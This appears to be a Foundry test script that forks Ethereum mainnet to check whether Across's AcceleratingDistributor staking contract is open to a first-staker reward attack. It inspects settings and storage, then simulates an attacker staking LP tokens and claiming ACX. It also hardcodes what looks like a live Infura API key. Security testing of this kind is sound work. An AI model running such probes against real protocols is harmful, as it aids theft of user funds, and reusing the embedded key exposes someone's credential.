// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function symbol() external view returns (string memory);
}

interface IAcceleratingDistributor {
    struct UserDeposit {
        uint256 cumulativeBalance;
        uint256 averageDepositTime;
        uint256 rewardsAccumulatedPerToken;
        uint256 rewardsOutstanding;
    }

    function rewardToken() external view returns (address);
    function stakingTokens(address) external view returns (
        bool enabled,
        uint256 baseEmissionRate,
        uint256 maxMultiplier,
        uint256 secondsToMaxMultiplier,
        uint256 cumulativeStaked,
        uint256 rewardPerTokenStored,
        uint256 lastUpdateTime
    );
    function stake(address stakedToken, uint256 amount) external;
    function unstake(address stakedToken, uint256 amount) external;
    function withdrawReward(address stakedToken) external;
    function getOutstandingRewards(address stakedToken, address account) external view returns (uint256);
    function getUserStake(address stakedToken, address account) external view returns (UserDeposit memory);
    function exit(address stakedToken) external;
}

contract AccelDeepDive is Test {
    address constant ACCEL = 0x9040e41eF5E8b281535a96D9a48aCb8cfaBD9a48;
    address constant ACX = 0x44108f0223A3C3028F5Fe7AEC7f9bb2E66beF82F;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    // Known LP tokens that might be staked
    address constant ACROSS_LP_ETH = 0x28F77208728B0A45cAb24c4868334581Fe86F95B;

    IAcceleratingDistributor accel;

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
        accel = IAcceleratingDistributor(ACCEL);
    }

    function testCheckRewardToken() public view {
        console.log("=====================================================");
        console.log("ACCELERATING DISTRIBUTOR ANALYSIS");
        console.log("=====================================================");

        address rewardToken = accel.rewardToken();
        console.log("Reward Token:", rewardToken);
        console.log("ACX matches:", rewardToken == ACX);

        uint256 acxBalance = IERC20(ACX).balanceOf(ACCEL);
        console.log("ACX in contract:", acxBalance / 1e18);
    }

    function testCheckKnownStakingTokens() public view {
        console.log("=====================================================");
        console.log("CHECKING KNOWN STAKING TOKENS");
        console.log("=====================================================");

        // Check common LP tokens
        address[5] memory tokens = [
            ACX,
            WETH,
            0x28F77208728B0A45cAb24c4868334581Fe86F95B, // Across LP ETH
            0x256C8919CE1AB0e33974CF6AA9c71561Ef3017b6, // Across LP USDC
            address(0)
        ];

        for (uint i = 0; i < tokens.length; i++) {
            if (tokens[i] == address(0)) continue;

            try accel.stakingTokens(tokens[i]) returns (
                bool enabled,
                uint256 baseEmissionRate,
                uint256 maxMultiplier,
                uint256 secondsToMaxMultiplier,
                uint256 cumulativeStaked,
                uint256 rewardPerTokenStored,
                uint256 lastUpdateTime
            ) {
                if (enabled || lastUpdateTime > 0) {
                    console.log("\n=== STAKING TOKEN ===");
                    console.log("Address:", tokens[i]);
                    console.log("Enabled:", enabled);
                    console.log("Base Emission Rate:", baseEmissionRate);
                    console.log("Max Multiplier:", maxMultiplier);
                    console.log("Seconds to Max:", secondsToMaxMultiplier);
                    console.log("Cumulative Staked:", cumulativeStaked / 1e18);
                    console.log("Reward Per Token:", rewardPerTokenStored);
                    console.log("Last Update:", lastUpdateTime);

                    if (enabled && cumulativeStaked == 0 && baseEmissionRate > 0) {
                        console.log("*** POTENTIAL FIRST STAKER ATTACK ***");
                    }
                }
            } catch {}
        }
    }

    function testSearchForEnabledTokens() public view {
        console.log("=====================================================");
        console.log("SEARCHING FOR ENABLED STAKING TOKENS VIA STORAGE");
        console.log("=====================================================");

        // The stakingTokens mapping is at some storage slot
        // We can try to find enabled tokens by scanning events or storage

        // First, let's try to find tokens by checking storage patterns
        console.log("Checking first 50 storage slots...");

        for (uint256 i = 0; i < 50; i++) {
            bytes32 slot = vm.load(ACCEL, bytes32(i));
            uint256 value = uint256(slot);

            if (value > 0 && value < type(uint160).max) {
                address potential = address(uint160(value));
                if (potential.code.length > 0) {
                    // Try to check if this is a staking token
                    try accel.stakingTokens(potential) returns (
                        bool enabled,
                        uint256 baseEmissionRate,
                        uint256,
                        uint256,
                        uint256 cumulativeStaked,
                        uint256,
                        uint256 lastUpdateTime
                    ) {
                        if (enabled || lastUpdateTime > 0) {
                            console.log("\nFound staking token at slot", i);
                            console.log("Address:", potential);
                            console.log("Enabled:", enabled);
                            console.log("Emission Rate:", baseEmissionRate);
                            console.log("Cumulative Staked:", cumulativeStaked / 1e18);
                        }
                    } catch {}
                }
            }
        }
    }

    function testAttemptFirstStakerAttack() public {
        console.log("=====================================================");
        console.log("ATTEMPTING FIRST STAKER ATTACK");
        console.log("=====================================================");

        // Try with Across LP token
        address stakingToken = 0x28F77208728B0A45cAb24c4868334581Fe86F95B;

        try accel.stakingTokens(stakingToken) returns (
            bool enabled,
            uint256 baseEmissionRate,
            uint256 maxMultiplier,
            uint256 secondsToMaxMultiplier,
            uint256 cumulativeStaked,
            uint256 rewardPerTokenStored,
            uint256 lastUpdateTime
        ) {
            console.log("Token enabled:", enabled);
            console.log("Base emission:", baseEmissionRate);
            console.log("Cumulative staked:", cumulativeStaked / 1e18);

            if (!enabled) {
                console.log("Token not enabled, trying another...");
                return;
            }

            address attacker = makeAddr("attacker");

            // Get some LP tokens
            uint256 stakeAmount = 1e18;
            deal(stakingToken, attacker, stakeAmount);

            vm.startPrank(attacker);
            IERC20(stakingToken).approve(ACCEL, type(uint256).max);

            uint256 acxBefore = IERC20(ACX).balanceOf(attacker);

            // Stake
            console.log("\nStaking...");
            accel.stake(stakingToken, stakeAmount);

            // Check outstanding rewards immediately
            uint256 outstanding = accel.getOutstandingRewards(stakingToken, attacker);
            console.log("Outstanding rewards:", outstanding / 1e18);

            // Warp time
            vm.warp(block.timestamp + 1 days);

            outstanding = accel.getOutstandingRewards(stakingToken, attacker);
            console.log("Outstanding after 1 day:", outstanding / 1e18);

            // Claim
            accel.withdrawReward(stakingToken);
            uint256 acxAfter = IERC20(ACX).balanceOf(attacker);

            console.log("\nACX before:", acxBefore / 1e18);
            console.log("ACX after:", acxAfter / 1e18);
            console.log("Gained:", (acxAfter - acxBefore) / 1e18, "ACX");

            // Check profit
            if (acxAfter > acxBefore) {
                console.log("\n*** REWARDS CLAIMED ***");
                // Check if this is exploitable (profit > gas)
            }

            vm.stopPrank();

        } catch Error(string memory reason) {
            console.log("Failed:", reason);
        } catch {
            console.log("Failed with unknown error");
        }
    }
}
